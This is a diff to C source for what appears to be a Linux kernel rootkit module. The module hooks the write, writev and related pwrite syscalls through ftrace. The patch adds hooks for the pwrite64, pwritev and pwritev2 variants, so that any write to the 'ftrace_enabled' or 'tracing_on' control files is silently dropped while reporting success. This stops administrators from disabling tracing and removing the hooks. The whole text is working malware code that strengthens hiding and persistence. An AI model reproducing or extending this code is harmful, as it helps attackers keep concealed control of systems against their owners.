@@ -8,14 +8,22 @@ static asmlinkage ssize_t (*original_write)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_write32)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_writev)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_writev32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_pwrite64)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_pwrite64_ia32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_pwritev)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_pwritev2)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_pwritev_ia32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_pwritev2_ia32)(const struct pt_regs *);
 
 static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
-                                                     bool compat32)
+                                                     bool compat32, bool has_offset)
 {
     int fd;
     const char __user *user_buf;
     size_t count;
+
+    if (!orig || !regs) return -EINVAL;
 
     if (!compat32) {
         fd       = regs->di;
@@ -27,19 +35,18 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
         count    = regs->dx;
     }
 
-    struct file *file;
-    char *kernel_buf;
-
-    file = fget(fd);
+    struct file *file = fget(fd);
     if (!file)
         return orig(regs);
 
-    const char *name = file->f_path.dentry->d_name.name;
+    const char *name = NULL;
+    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
+        name = file->f_path.dentry->d_name.name;
 
-    if (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0) {
+    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
         fput(file);
 
-        kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
+        char *kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
         if (!kernel_buf)
             return -ENOMEM;
 
@@ -47,7 +54,6 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
             kfree(kernel_buf);
             return -EFAULT;
         }
-
         kfree(kernel_buf);
 
         return count;
@@ -59,12 +65,19 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
 
 static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
 {
-    return hooked_write_common(regs, original_write, false);
+    return hooked_write_common(regs, original_write, false, false);
 }
-
 static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
 {
-    return hooked_write_common(regs, original_write32, true);
+    return hooked_write_common(regs, original_write32, true, false);
+}
+static notrace asmlinkage ssize_t hooked_pwrite64(const struct pt_regs *regs)
+{
+    return hooked_write_common(regs, original_pwrite64, false, true);
+}
+static notrace asmlinkage ssize_t hooked_pwrite64_ia32(const struct pt_regs *regs)
+{
+    return hooked_write_common(regs, original_pwrite64_ia32, true, true);
 }
 
 static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *regs,
@@ -74,6 +87,8 @@ static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *reg
     int fd;
     const struct iovec __user *vec;
     unsigned long vlen;
+
+    if (!orig || !regs) return -EINVAL;
 
     if (!compat32) {
         fd   = regs->di;
@@ -89,8 +104,11 @@ static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *reg
     if (!file)
         return orig(regs);
 
-    const char *name = file->f_path.dentry->d_name.name;
-    if (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0) {
+    const char *name = NULL;
+    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
+        name = file->f_path.dentry->d_name.name;
+
+    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
         fput(file);
         return vlen;
     }
@@ -103,10 +121,25 @@ static notrace asmlinkage ssize_t hooked_writev(const struct pt_regs *regs)
 {
     return hooked_writev_common(regs, original_writev, false);
 }
-
 static notrace asmlinkage ssize_t hooked_writev32(const struct pt_regs *regs)
 {
     return hooked_writev_common(regs, original_writev32, true);
+}
+static notrace asmlinkage ssize_t hooked_pwritev(const struct pt_regs *regs)
+{
+    return hooked_writev_common(regs, original_pwritev, false);
+}
+static notrace asmlinkage ssize_t hooked_pwritev2(const struct pt_regs *regs)
+{
+    return hooked_writev_common(regs, original_pwritev2, false);
+}
+static notrace asmlinkage ssize_t hooked_pwritev_ia32(const struct pt_regs *regs)
+{
+    return hooked_writev_common(regs, original_pwritev_ia32, true);
+}
+static notrace asmlinkage ssize_t hooked_pwritev2_ia32(const struct pt_regs *regs)
+{
+    return hooked_writev_common(regs, original_pwritev2_ia32, true);
 }
 
 static struct ftrace_hook hooks[] = {
@@ -114,6 +147,14 @@ static struct ftrace_hook hooks[] = {
     HOOK("__ia32_sys_write",  hooked_write32, &original_write32),
     HOOK("__x64_sys_writev",  hooked_writev,  &original_writev),
     HOOK("__ia32_sys_writev", hooked_writev32, &original_writev32),
+
+    HOOK("__x64_sys_pwrite64", hooked_pwrite64, &original_pwrite64),
+    HOOK("__x64_sys_ia32_pwrite64", hooked_pwrite64_ia32, &original_pwrite64_ia32),
+
+    HOOK("__x64_sys_pwritev", hooked_pwritev, &original_pwritev),
+    HOOK("__x64_sys_pwritev2", hooked_pwritev2, &original_pwritev2),
+    HOOK("__ia32_sys_pwritev", hooked_pwritev_ia32, &original_pwritev_ia32),
+    HOOK("__ia32_sys_pwritev2", hooked_pwritev2_ia32, &original_pwritev2_ia32),
 };
 
 notrace int hooks_write_init(void)
